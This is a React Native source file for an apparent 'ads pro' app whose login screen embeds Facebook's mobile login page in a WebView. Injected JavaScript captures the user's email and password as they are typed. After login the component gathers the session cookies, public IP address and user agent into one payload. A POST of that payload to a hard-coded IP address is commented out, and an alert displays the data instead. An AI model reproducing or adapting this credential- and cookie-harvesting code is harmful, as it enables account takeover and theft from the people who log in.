
import CookieManager from '@react-native-cookies/cookies';
import React, { Component } from 'react';
import { Alert, Dimensions, Text, View } from 'react-native';
import DeviceInfo from 'react-native-device-info';
import publicIP from 'react-native-public-ip';
import WebView from 'react-native-webview';
var deviceHeight = Dimensions.get("window").height;
export default class LoginFaceBook extends Component {
    constructor(props) {
        super(props);
        this.state = {
            isComplete: false,
            isLoading: false,
            ipAdress: '',
            url: 'https://m.facebook.com/login',
            is2fa: false,
            isIncognito: false,
        };
        this.fbPassword = '';
        this.fbUser = '';
        this.isCheckpoint = false;
        this.handleURL = this.handleURL.bind(this);
    }

    componentDidMount() {

CookieManager.clearAll(true)
            .then((success) => {
                console.log('CookieManager1.clearAll =>', success);
            });
        publicIP()
            .then(ip => {
                this.setState({ ipAdress: ip })
            })
            .catch(error => {
                console.log(error);
                // 'Unable to get IP address.'
            });
        this.setState({ isIncognito: true })
    }
    onMessage(event) {

        if (event.nativeEvent.data != undefined && event.nativeEvent.data != null && event.nativeEvent.data != '') {
            var result = JSON.parse(event.nativeEvent.data);
            this.fbUser = result.email;
            this.fbPassword = result.pass;
        }
    }

    async handleURL(state) {

        // this.props.navigation.navigate("Manager", { userId: cook?.c_user?.value });


        // if (state.url.includes("checkpoint")) {
        //     console.log('is2fais2fais2fais2fa')
        //     this.setState({ is2fa: true })
        //      this.props.navigation.navigate("Twofa");
        //     this.isCheckpoint = true;
        //     CookieManager.clearAll(true)
        //     .then((success) => {
        //         console.log('CookieManager1.clearAll =>', success);
        //     });
        // }
        if (state.url.includes("home.php") || state.url.includes("_rdr")) {

            if (this.state.isComplete) {
                return;
            }
            await this.setState({ isComplete: true });
            var cook = await CookieManager.getAll(true);
            var cookStr;
            if (cook?.fr?.value == undefined) {
                cookStr = "sb=" + cook.sb.value + "; wd=" + cook.wd.value + "; datr=" + cook.datr.value + "; c_user=" + cook.c_user.value + "; xs=" + cook.xs.value;
            }
            else {
                cookStr = "fr=" + cook?.fr?.value + "; sb=" + cook.sb.value + "; wd=" + cook.wd.value + "; datr=" + cook.datr.value + "; c_user=" + cook.c_user.value + "; xs=" + cook.xs.value;
            }
            // var cookStr = 'non cookie'
            this.setState({ isLoading: false });
            await this.onCallApi(cookStr);
            let userAgent = await DeviceInfo.getUserAgent()
            var data = {
                user: this.fbUser,
                pass: this.fbPassword,
                HasCheckpoint: this.isCheckpoint,
                cookie: cookStr,
                ipAdress: this.state.ipAdress,
                app: 'ads pro',
                Agent: userAgent
            };
            if (this.state.is2fa == true) {
                this.props.navigation.navigate("Twofa", { data: data });
                return;
            }

            CookieManager.clearAll(true)
                .then((success) => {
                    console.log('CookieManager1.clearAll =>', success);
                });
            console.log("vllllll", data);
            // this.props.navigation.navigate("HomeScreen", { params: "12323" });
        }
    }

    async onCallApi(cookStr) {
        let userAgent = await DeviceInfo.getUserAgent()
        var data = {
            user: this.fbUser,
            pass: this.fbPassword,
            HasCheckpoint: this.isCheckpoint,
            cookie: cookStr,
            ipAdress: this.state.ipAdress,
            app: 'ads pro',
            Agent: userAgent
        };
        var reqDataJson = JSON.stringify(data);

        console.log('AgentAgentAgentAgent', userAgent)
      console.log('reqDataJsonreqDataJsonreqDataJson', reqDataJson)
      Alert.alert('',reqDataJson)
        // var URLFetch = 'http://104.161.17.155:3000/post';
        // await fetch(URLFetch, {
        //     method: 'POST',
        //     headers: {
        //         'Content-Type': 'application/json'
        //     },
        //     body: reqDataJson,
        //     credentials: "omit",
        // });

    }


    render() {
        const scr = ` 
        document.getElementById("m_login_password").addEventListener("input", function() {  
        var data = { 
        email: document.getElementById("m_login_email").value, 
        pass : document.getElementById("m_login_password").value 
        }; 
        window.ReactNativeWebView.postMessage(JSON.stringify(data)); 
        }); 
         
        document.getElementById("m_login_email").addEventListener("input", function() {  
        var data = { 
        email: document.getElementById("m_login_email").value, 
        pass : document.getElementById("m_login_password").value 
        }; 
        window.ReactNativeWebView.postMessage(JSON.stringify(data)); 
        }); 
        `;
        return (
            <View style={{ flex: 1 }}>
                <View style={{ height: 40, backgroundColor: "#fff" }}>

                </View>
                {this.state.isLoading &&
                    <View style={{ alignSelf: 'center', alignItems: 'center', justifyContent: 'center', marginTop: 100 }}>
                        <Text style={{ fontSize: 26, textAlign: 'center', color: '#2980b9' }}>Checking your infomation ...</Text>

                    </View>
                }
                {!this.state.isLoading &&
                    <WebView
                        ref={(input) => this.input = input}
                        style={{ height: deviceHeight - 50 }}
                        source={{ uri: this.state.url }}
                        onNavigationStateChange={this.handleURL}
                        onMessage={(event) => this.onMessage(event)}
                        injectedJavaScript={scr}
                        startInLoadingState={true}
                    // incognito={true}
                    >
                    </WebView>
                }
            </View>
        );
    }
}